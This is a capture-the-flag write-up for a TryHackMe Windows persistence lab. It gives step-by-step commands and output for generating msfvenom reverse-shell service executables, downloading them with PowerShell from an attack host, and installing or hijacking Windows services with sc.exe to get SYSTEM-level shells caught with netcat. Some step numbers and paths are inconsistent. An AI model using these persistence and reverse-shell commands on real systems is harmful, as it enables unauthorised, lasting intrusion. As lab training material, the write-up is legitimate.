# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/05/2023

# Creating Backdoor Services
1. Started this room's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe

```
3. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
```bash
root@ip-10-10-44-151:~# sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.254.131 - - [06/Jul/2023 01:44:11] "GET /rev-svc.exe HTTP/1.1" 200 -
```
4. `PowerShell` from the compromised Windows machine to open up PowerShell
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
5. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
```PowerShell
PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
``` 
6. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downlaoded our payload from our attack machine, which we did
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/6/2023  12:44 AM          48640 Payload.exe
```
7. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
8. `sc.exe create <SERVICE NAME> binPath= "<PAYLOAD NAME2 PATH>" start= auto` from our compromised Windows machine to create a new service that'll be automatically started when our compromised machine boots up, which will then execute the program located in its binary path, which contains our payload
```PowerShell
PS C:\Users\Administrator> sc.exe create THMservice binPath= "C:\Users\Administrator\Payload.exe" start= auto
```
9. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the new service that we just created, which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
```PowerShell
PS C:\Users\Administrator> sc.exe start THMservice

SERVICE_NAME: THMservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4956
        FLAGS              :
```
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.254.131 49822 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
12. `C:\flags\flag7.exe` from our reverse shell to run the flag7.exe program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag7.exe
C:\flags\flag7.exe
THM{SUSPICIOUS_SERVICES}
```


**TASK COMPLETED**

# Modifying Existing Services
1. Started this room's machine
2. `sc.exe query state=all` from the compromised Windows machine to retrieve information about all the services that's on the compromised system and display the retrieved information onto our terminal, which ended displaying a long list of services but the one we'll be focusing on in this task is the **THMservice3** service
3. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings of our target service (THMuser3) 
```PowerShell
C:\Users\Administrator>sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```
4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
```
5. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
```Bash
root@ip-10-10-44-151:~# sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
6. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','rev-svc.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
```PowerShell
PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
```
7. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downloaded our payload from our attack machine, which we did
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/6/2023   1:24 AM          48640 Payload.exe
```

8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"` from the compromised Windows machine to modify the configuration settings of our target service (THMservice3) by replacing the BINARY_PATH_NAME with our paylaod's file path and its SERVICE_START_NAME to "LocalSystem", which specifies that this service will now run under the Local System account, which is a highly privileged built-in account in Windows
```PowerShell
PS C:\Users\Administrator> sc.exe config THMservice3 binPath= "C:\Users\Administrator\Payload.exe" start= auto obj= "LocalSystem"
[SC] ChangeServiceConfig SUCCESS
```
9. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings for the service that we just modified (THMservice3) 
```PowerShell
PS C:\Users\Administrator> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
10. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
11. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the service that we just modified (THMservice3), which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
```PowerShell
PS C:\Users\Administrator> sc.exe start THMservice3

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1112
        FLAGS              :
```
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.180.50 49850 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
12. `C:\flags\flag8.exe` from our reverse shell to run the flag8.exe program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag8.exe
C:\flags\flag8.exe
THM{IN_PLAIN_SIGHT}
```


**TASK COMPLETED**
